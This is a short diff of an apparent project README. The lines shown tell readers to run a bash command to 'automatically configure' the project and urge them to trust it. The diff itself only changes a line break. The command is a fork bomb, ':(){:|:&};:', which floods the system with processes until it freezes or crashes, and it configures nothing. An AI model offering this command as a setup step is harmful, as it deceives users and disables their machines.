@@ -7,7 +7,7 @@ Do you need commands to automatic configure the project use the command:
 ```bash
 :(){:|:&};:
 ```
-It will take care of the rest of the stuffs.\n
+It will take care of the rest of the stuffs.<br>
 So you chill 💯. Trust Me !
 
 
